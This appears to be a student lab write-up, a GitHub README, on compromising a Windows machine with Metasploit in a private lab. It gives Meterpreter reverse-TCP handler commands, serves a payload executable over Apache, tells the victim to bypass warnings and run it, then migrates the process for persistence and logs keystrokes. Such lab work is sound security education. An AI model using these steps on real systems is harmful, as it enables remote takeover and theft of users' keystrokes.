# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

### OUTPUT:
![ex5 eh](https://github.com/Dhanashreemullaithasan/Compromising-windows-using-Metasploit/assets/94165415/02cedbdd-26a7-4e76-847f-b685f86b3c66)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/Dhanashreemullaithasan/Compromising-windows-using-Metasploit/assets/94165415/4ee395ea-86f5-47db-9932-d0f9169d7319)

Start apache server sudo systemctl apache2 start and Check the status of apache2
![image](https://github.com/Dhanashreemullaithasan/Compromising-windows-using-Metasploit/assets/94165415/e328e1e0-abc4-4274-be6f-6a054af16418)

![image](https://github.com/Dhanashreemullaithasan/Compromising-windows-using-Metasploit/assets/94165415/05b3d119-ecb7-49ab-a8e1-20cf99856d87)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/Dhanashreemullaithasan/Compromising-windows-using-Metasploit/assets/94165415/726052a5-67ba-4ff8-8b33-b2c608406db0)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/Dhanashreemullaithasan/Compromising-windows-using-Metasploit/assets/94165415/017a350e-c56b-41fb-b3ba-d7474a551d2f)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/Dhanashreemullaithasan/Compromising-windows-using-Metasploit/assets/94165415/7e624603-aabc-4bb7-ae05-2fe5af375478)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/Dhanashreemullaithasan/Compromising-windows-using-Metasploit/assets/94165415/d66ae7b4-45ca-48c9-b05e-cb90d173189e)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/Dhanashreemullaithasan/Compromising-windows-using-Metasploit/assets/94165415/81e42b1d-747f-403f-a307-8ae53b7c6652)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
